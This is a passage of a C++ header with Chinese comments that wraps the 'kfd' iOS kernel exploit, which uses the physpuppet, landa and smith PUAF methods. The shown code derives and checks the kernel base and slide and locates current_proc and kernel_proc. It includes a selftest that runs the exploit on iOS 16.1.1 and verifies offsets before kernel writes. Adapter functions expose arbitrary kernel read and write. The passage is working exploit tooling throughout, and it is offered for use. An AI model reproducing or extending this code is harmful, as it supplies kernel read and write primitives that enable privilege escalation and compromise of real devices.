    //      正好落在读回来的这个 8 字节字的**低** 32 位，magic 本身也 < 2^32，不需要移位。
    //      （perf.h:108-109 里 kfd 自己校验 base / base+4 时读的也是 u32，值一样。）
    const uint64_t word = kfdg_read_u64(handle, base);
    const uint32_t magic = (uint32_t)(word & 0xffffffffull);
    if (magic != kMachOMagic64) {
        printf("[kfd] kernel base 校验失败：base=0x%llx 处 magic=0x%08x（期望 0x%08x）→ 不返回这个地址\n",
               (unsigned long long)base, (unsigned)magic, (unsigned)kMachOMagic64);
        printf("[kfd]   这说明 slide 算出来是错的，或 /dev/aes_0 那条 perf 链路没铺好；\n");
        printf("[kfd]   带着这个 base 去算偏移一定会写到错地方。\n");
        return 0;
    }

    printf("[kfd] kernel base = 0x%llx（slide=0x%llx，magic 0x%08x 校验通过）\n",
           (unsigned long long)base,
           (unsigned long long)kfdg_kernel_slide(handle),
           (unsigned)magic);
    return base;
}

inline bool Client::read_kernel_base(uint64_t* out_base) const {
    if (out_base) *out_base = 0;
    if (!out_base) {
        printf("[kfd] read_kernel_base 失败：出参为 NULL\n");
        return false;
    }
    const uint64_t base = kernel_base();
    if (base == 0) return false;
    *out_base = base;
    return true;
}

// ---------------------------------------------------------------------------
// Client::shutdown
// ---------------------------------------------------------------------------

inline void Client::shutdown() {
    if (handle == 0) {
        printf("[kfd] shutdown：当前没有句柄，什么都不做\n");
        ok = false;
        method = -1;
        return;
    }
    kfdg_close(handle);
    printf("[kfd] shutdown：完成（perf 的 fd / shared_page、PUAF、KRKW 对象都已释放）\n");
    handle = 0;
    method = -1;
    ok = false;
}

// ---------------------------------------------------------------------------
// 纯读取值：kfd 已经把 current_proc / kernel_proc / kernel_slide 解析好了，直接用
// （find_proc 在 kread_sem_open.h:95-115，info_run 在 info.h:146-218）
// ---------------------------------------------------------------------------

inline uint64_t Client::kernel_proc() const {
    if (handle == 0) return 0;
    return kfdg_kernel_proc(handle);
}

inline uint64_t Client::current_proc() const {
    if (handle == 0) return 0;
    return kfdg_current_proc(handle);
}

inline uint64_t Client::kernel_slide() const {
    if (handle == 0) return 0;
    return kfdg_kernel_slide(handle);
}

// ---------------------------------------------------------------------------
// selftest：把「命中版本 → open → base + magic → current_proc/kernel_proc 的 p_pid → close」
// 一次走完。每一步都打 [kfd] 前缀的中文日志；任何一步不过都先 shutdown 再返回 false，
// 绝不把活句柄留在进程里。
// 默认用 landa（method=1）+ 2048 页：本机 16.1.1 早于这三种 puaf 的修复版本，三个都能选；
// landa 是 kfd 在 16.x 上最常用的那一档。
// ---------------------------------------------------------------------------

inline bool selftest(int method = 1, uint64_t puaf_pages = kDefaultPuafPages) {
    printf("[kfd] ======== selftest 开始 ========\n");

    // 第 0 步：先单独看版本命中（还没开句柄，失败了就是一行日志，代价最小）
    char kern_version[512] = {0};
    if (!sysctl_str("kern.version", kern_version, sizeof(kern_version))) {
        printf("[kfd] selftest 失败：读不到 kern.version\n");
        printf("[kfd] ======== selftest 结束：FAIL ========\n");
        return false;
    }
    trim_eol(kern_version);
    const int vid = kfdg_version_index(kern_version);
    if (vid < 0) {
        printf("[kfd] selftest 失败：内核版本不在 kern_versions[] 表内（未调用 kfdg_open）\n");
        printf("[kfd] ======== selftest 结束：FAIL ========\n");
        return false;
    }
    printf("[kfd] selftest: 版本命中下标 [%d]\n", vid);

    Client c;
    bool ok = true;

    // 第 1 步：走完整门禁 + open
    if (!c.init(method, puaf_pages)) {
        printf("[kfd] selftest 失败：init 没通过（原因见上面日志）\n");
        ok = false;
    }

    // 第 2 步：内核基址 + Mach-O magic（kernel_base 内部已校验）
    uint64_t base = 0;
    if (ok) {
        base = c.kernel_base();
        if (base == 0) {
            printf("[kfd] selftest 失败：kernel_base() 返回 0\n");
            ok = false;
        }
    }

    // 第 3 步：current_proc 的 p_pid 必须等于 getpid() —— 这一步才真正证明偏移对。
    //   p_pid 偏移用 kProcPidOffset（0x60），来源见常量定义处（dynamic_info.h:14156）。
    uint64_t cur_proc = 0;
    if (ok) {
        cur_proc = c.current_proc();
        printf("[kfd] selftest: current_proc = 0x%llx\n", (unsigned long long)cur_proc);
        if (cur_proc == 0) {
            printf("[kfd] selftest 失败：current_proc=0\n");
            ok = false;
        }
    }
    if (ok) {
        const uint64_t word = kfdg_read_u64(c.handle, cur_proc + kProcPidOffset);
        const int32_t pid_read = (int32_t)(word & 0xffffffffull);
        const int32_t pid_real = (int32_t)getpid();
        printf("[kfd] selftest: 用到的 proc__p_pid 偏移 = 0x%llx（条目 171 / build %s）\n",
               (unsigned long long)kProcPidOffset, kExpectedBuildId);
        printf("[kfd] selftest: 读回 p_pid = %d，本进程 getpid() = %d\n",
               (int)pid_read, (int)pid_real);
        if (pid_read != pid_real) {
            printf("[kfd] selftest 失败：p_pid 对不上 —— 说明 proc 偏移或 slide 不对，禁止继续写内核\n");
            ok = false;
        } else {
            printf("[kfd] selftest: p_pid 校验通过（proc 偏移可用）\n");
        }
    }

    // 第 4 步：kernel_proc 的 p_pid 应当是 0（launchd 对应的内核 task 的 proc）。
    // 这一条是"独立第二证据"：它跟 getpid() 那条互不相干，两条都过才敢动内核。
    if (ok) {
        const uint64_t ker_proc = c.kernel_proc();
        printf("[kfd] selftest: kernel_proc  = 0x%llx\n", (unsigned long long)ker_proc);
        if (ker_proc == 0) {
            printf("[kfd] selftest 失败：kernel_proc=0（find_proc 只回了 current_proc）——\n");
            printf("[kfd]   没有第二证据就不往下写内核，先把 find_proc 那条链路查清\n");
            ok = false;
        } else {
            const uint64_t kw = kfdg_read_u64(c.handle, ker_proc + kProcPidOffset);
            const int32_t kpid = (int32_t)(kw & 0xffffffffull);
            printf("[kfd] selftest: kernel_proc->p_pid = %d（期望 0）\n", (int)kpid);
            if (kpid != 0) {
                printf("[kfd] selftest 失败：kernel_proc 的 p_pid 不是 0 —— 偏移链可疑，先别写内核\n");
                ok = false;
            } else {
                printf("[kfd] selftest: kernel_proc->p_pid 校验通过\n");
            }
        }
    }

    // 收尾：无论成败都 close，避免把 PUAF 状态留在进程里
    c.shutdown();
    printf("[kfd] ======== selftest 结束：%s ========\n", ok ? "PASS" : "FAIL");
    return ok;
}

// ---------------------------------------------------------------------------
// 接进 kback::Ops 用的适配层
//
// KernelBackend.h 的 Ops 里全是"无上下文参数的函数指针"
// （bool (*)(uint64_t, void*, size_t) 这种），没法带 this，所以只能用单例。
// 这里不 include KernelBackend.h —— 本文件的 include 清单是被限定的，
// 由调用方在自己那边 set_backend 时把下面这几个地址填进 kback::Ops 即可。
// ---------------------------------------------------------------------------

inline Client& shared() {
    static Client c;
    return c;
}

// 默认用 landa（0=physpuppet 1=landa 2=smith）
inline bool ops_init(void) {
    return shared().init(1);
}

inline bool ops_kread(uint64_t addr, void* out, size_t len) {
    return shared().kread_buf(addr, out, (uint64_t)len);
}

inline bool ops_kwrite(uint64_t addr, const void* in, size_t len) {
    return shared().kwrite_buf(const_cast<void*>(in), addr, (uint64_t)len);
}

inline uint64_t ops_kbase(void) {
    return shared().kernel_base();
}

} // namespace kfdb
